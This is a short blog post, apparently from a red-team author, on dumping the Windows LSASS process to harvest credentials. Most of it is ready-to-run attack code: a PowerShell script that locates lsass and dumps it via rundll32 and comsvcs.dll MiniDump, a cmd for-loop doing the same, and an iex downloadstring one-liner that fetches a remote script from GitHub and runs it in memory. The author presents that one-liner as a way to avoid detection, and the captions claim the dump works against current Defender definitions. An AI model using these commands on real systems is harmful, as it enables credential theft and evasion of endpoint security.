---
title:  "LSASS Encrypted Dump"
date:   2021-08-13 21:20:00 +0000
categories: [techniques]
tags: [windows, lsass]
---


There are many, many ways to dump the LSASS process in order to gather credentials and other sensitive information from systems.

Two ways I dump LSASS can be seen below.

The first way is to invoke comsvcs.dll with rundll32 - here is the original code with added zipping but not compressing the file as to not cuase potential corruption.

```
$processes = Get-Process
$location = Get-Location
$dumpid = foreach ($process in $processes){if ($process.ProcessName -eq "lsass"){$process.id}}
	Write-Host "Found l s a s s process with ID $dumpid - starting dump with rundll32"
	Write-Host "Dumpfile goes to Get-Location\$env:COMPUTERNAME.bin"
	rundll32 C:\Windows\System32\comsvcs.dll, MiniDump $dumpid $location\$env:COMPUTERNAME.bin full | Out-Null
	Compress-Archive -Path $location\$env:COMPUTERNAME.bin -DestinationPath $location\$env:COMPUTERNAME.zip -CompressionLevel NoCompression
```


We can also encode and encrypt the script to make it harder to be detected and run it straight in memory via Invoke Expression.

```
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/sp00ks-git/PowerShell-Stuff/main/lsass-dump')
```


Another way is by using a for loop as follows:

```
for /f "tokens=1,2 delims= " ^%A in ('"tasklist /fi "Imagename eq lsass.exe" | find "lsass""') do C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump ^%B lsass.dmp full
```

![img-description](/images/lsass-1.png)
_LSASS Dumping with uptodate Defender Definitions"_


![img-description](/images/lsass-2.png)
_executing the script_


